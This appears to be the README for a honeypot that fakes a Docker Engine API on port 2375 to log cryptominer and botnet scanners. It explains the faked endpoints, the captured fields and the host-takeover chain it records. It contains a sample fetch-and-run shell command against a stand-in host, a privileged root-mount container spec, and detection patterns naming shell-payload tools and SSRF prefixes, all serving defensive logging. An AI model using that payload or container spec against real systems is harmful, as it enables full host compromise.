# Fake Docker Engine API (daemon on 2375)

Serves a plausible Docker Engine API surface so cryptominer / botnet
scanners that probe `:2375` ship their full container spec before we
ack a fake container ID and 204 the `/start`.

## Paths

| Path | Method | Response |
|------|--------|----------|
| `/version` | GET | Engine version + API version + components (containerd / runc / docker-init) |
| `/info` | GET | Daemon info (driver, plugins, runtimes, kernel, OS) |
| `/_ping` | GET | `OK` |
| `/containers/json` | GET | `[]` (empty list — cryptominer scanners create regardless) |
| `/images/json` | GET | Two plausible base images (`alpine:3.18`, `ubuntu:22.04`) |
| `/images/create` | POST | Plausible pull-progress stream |
| `/containers/create` | POST | `{"Id":"<64-hex>","Warnings":[]}` — fake container ID minted per request |
| `/containers/<id>/start` | POST | `204 No Content` |
| `/containers/<id>/{stop,kill,restart}` | POST | `204 No Content` |
| `/containers/<id>/wait` | POST | `{"StatusCode":0}` |
| `/containers/<id>/json` | GET | `{"Id":...,"State":{"Status":"running","Running":true}}` |
| `/containers/<id>/exec` | POST | `{"Id":"<64-hex>"}` — fake exec ID minted per request |
| `/exec/<id>/start` | POST | Empty `200 OK` (hijacked-stream shape) |
| `/exec/<id>/{json,resize}` | GET / POST | Plausible exec inspect / resize responses |
| `/containers/<id>/logs` | GET | Docker multiplexed log stream (see below); `400 Bad parameters` when neither `stdout` nor `stderr` is selected |
| `/networks` | GET | The three stock local networks (`bridge`, `host`, `none`) |
| `/volumes` | GET | One plausible named local volume |
| `/system/df` | GET | Stock disk-usage summary |
| `/auth` | POST | `{"Status":"Login Succeeded","IdentityToken":""}` + registry-credential capture |
| `/build` | POST | Chunked build-output stream shape |
| `/commit` | POST | `{"Id":"sha256:<64-hex>"}` — per-request image ID |
| `/swarm`, `/services`, `/secrets`, `/configs`, `/nodes`, `/tasks` | GET | `503` stock "this node is not a swarm manager" error |

### Container log read-back

`GET /containers/<id>/logs` closes the takeover chain: `create` →
`start` → `exec` → **read the output back**. That is the step where a
loader confirms its payload executed, so a 404 there ends the
engagement at the point of maximum engagement.

The body is Docker's multiplexed stream framing — an 8-byte header per
frame (stream type, three zero bytes, big-endian `uint32` length)
followed by the payload, served as
`Content-Type: application/vnd.docker.multiplexed-stream`. Clients that
call the endpoint without a TTY parse this framing and choke on a raw
byte blob, so emitting it correctly is what keeps a real Docker client
— and the loaders that embed one — in the chain.

The content is deliberately generic runtime chatter. The trap does not
know which command the caller asked for, so inventing its output would
contradict whatever they sent; what it can assert is the framing and
that a container process started.

### Swarm routes

`/info` advertises `Swarm.LocalNodeState: inactive` and
`ControlAvailable: false`, so the swarm-manager routes return the
verbatim non-manager `503` a stock daemon returns rather than a
manager-shaped list. A list here would contradict `/info` and
fingerprint the surface; the `503` is also a stronger tell than a `404`
that a genuine daemon is listening. A regression test pins `/info` and
these routes together so the two cannot drift apart.

All responses set `Server: Docker/<version> (linux)` and
`Api-Version: 1.43` headers — cryptominer scanners gate Cmd-shipping
on a Docker server banner.

## Path normalisation

The matcher strips two optional prefixes before endpoint lookup:

- `/vMAJOR.MINOR[.PATCH]` — the API version prefix Docker clients send
  (`/v1.43/containers/json` → `/containers/json`).
- `/{:|%3a|%253a}2375` — the colon-port SSRF shim scanners ship when
  reaching the daemon through a proxy / SSRF chain. Logged as a
  separate `dockerDaemonHasSsrfPrefix` flag.

Both prefixes can stack: `/%253a2375/v1.41/_ping` resolves to `/_ping`.

## Logging

Every request logs `dockerDaemonPath`, `dockerDaemonMethod`,
`dockerDaemonEndpoint` (the normalised endpoint), and a `result` tag
(`docker-daemon-version`, `docker-daemon-info`, `docker-daemon-ping`,
`docker-daemon-containers-list`, `docker-daemon-images-list`,
`docker-daemon-container-create`, `docker-daemon-container-start`,
`docker-daemon-exec-create`, `docker-daemon-exec-start`, ...).

`POST /containers/create` and `POST /containers/<id>/exec` extract:

- `dockerDaemonImage` — image name from the JSON body
- `dockerDaemonCmd` — Cmd array joined to a string
- `dockerDaemonEntrypoint` — Entrypoint array joined
- `dockerDaemonEnvCount` — number of `Env` entries
- `dockerDaemonHasPrivileged` — `HostConfig.Privileged: true`
- `dockerDaemonHasHostMount` — `HostConfig.Binds` contains `/:/`,
  `/etc:`, `/root:`, `/var/run/docker.sock`, `/proc:`, or `/sys:`
- `dockerDaemonHasHostPid` — `HostConfig.PidMode == "host"`
- `dockerDaemonHasHostNetwork` — `HostConfig.NetworkMode == "host"`
- `dockerDaemonHasDangerousCap` — `HostConfig.CapAdd` contains
  `SYS_ADMIN` or `ALL`
- `dockerDaemonHasShellPayload` — Cmd / body contains `wget`,
  `curl`, `|sh`, `chmod +x`, `base64 -d`, etc.

Strict `json.loads` runs first; on parse failure (trailing commas, etc.)
a substring scan over the body still surfaces the host-takeover flags.

Mutation requests also log `dockerDaemonBodySha256` and a
`dockerDaemonBodyPreview` (first 1 KB).

`X-Registry-Auth` (Docker-specific) and `Authorization` headers are
captured in `dockerDaemonAuthHeader`.

`POST /auth` additionally decodes the registry credentials the caller
submits — either a base64url JSON blob in `X-Registry-Auth` or a plain
JSON body — into `dockerDaemonAuthUsername`, `dockerDaemonAuthServer`,
`dockerDaemonAuthPasswordSha256`, `dockerDaemonAuthPasswordLen` and
`dockerDaemonAuthSource` (`header` / `body`). Which registry an
operator authenticates against, and under what account, is the point of
answering `/auth` at all. The password is recorded as a hash so
credential reuse can be correlated across hits, and is never reflected
back to the caller; `IdentityToken` in the response stays empty, which
is both what a stock daemon returns after a username/password login and
what keeps a fixed credential-shaped literal out of the response.

`GET /containers/<id>/logs` logs `dockerDaemonTargetContainerId`,
`dockerDaemonStage: logs`, and `dockerDaemonLogsFollow`.

Container / exec IDs issued by the trap are echoed back in the
response **and** logged as `dockerDaemonIssuedContainerId` /
`dockerDaemonIssuedExecId`, so the follow-up `/containers/<id>/start`
or `/exec/<id>/start` can be joined to the original `create` by ID.

## Why

Misconfigured Docker daemons bound to `0.0.0.0:2375` without TLS are a
long-tail attacker target. The standard exploit is a one-shot full host
takeover:

1. Scanner probes `/version` and `/_ping` to confirm a live engine.
2. Scanner posts `/containers/create` with `Image: alpine:latest`,
   `Cmd: ["/bin/sh","-c","curl http://x/y.sh | sh"]`, and
   `HostConfig.Privileged: true` plus `Binds: ["/:/mnt/host"]` (root
   filesystem of the host mounted into the container).
3. Scanner posts `/containers/<id>/start`. The privileged container
   runs the shell payload against the bind-mounted host FS — full
   takeover, no persistence on the daemon itself.

Many scanners reach the daemon through a proxy / SSRF chain and ship
the colon-port shape literally or URL-encoded in the path
(`/:2375/containers/json`, `/%3a2375/...`, `/%253a2375/...`); these
shapes are flagged as a separate signal because they almost never
appear in legitimate Docker client traffic.

Returning a plausible Engine API surface gives the scanner room to
ship its full container spec (image, Cmd, HostConfig.Binds,
Privileged, namespace sharing, dangerous capabilities) before we
ack a fake container ID and 204 the `/start` — at which point the
full exploitation chain is in the access log without ever pulling
the attacker's image.

## Config

| Env var | Default | Description |
|---------|---------|-------------|
| `HONEYPOT_DOCKER_DAEMON_ENABLED` | `true` | Master switch |
| `HONEYPOT_DOCKER_DAEMON_API_VERSION` | `1.43` | API version advertised in headers + `/version` |
| `HONEYPOT_DOCKER_DAEMON_ENGINE_VERSION` | `24.0.7` | Engine version advertised in `Server` header + `/version` + `/info` |
| `HONEYPOT_DOCKER_DAEMON_BODY_DECODE_LIMIT` | `8192` | Bytes of POST body to decode for JSON parsing |
| `HONEYPOT_DOCKER_DAEMON_BODY_PREVIEW_LIMIT` | `1024` | Bytes of POST body preview kept in the log |
